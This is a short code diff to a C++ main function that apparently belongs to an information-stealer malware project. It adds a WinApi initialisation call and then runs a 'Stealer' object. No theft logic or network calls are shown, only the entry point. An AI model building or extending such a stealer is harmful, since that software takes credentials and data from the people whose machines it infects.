@@ -1,8 +1,10 @@
 #include "stealer/Stealer.h"
+#include "winapi.h"
 
 int main() {
-    Stealer stealer;
-    stealer.run();
+    WinApi::Init();
+
+    Stealer().run();
 
     return 0;
 }
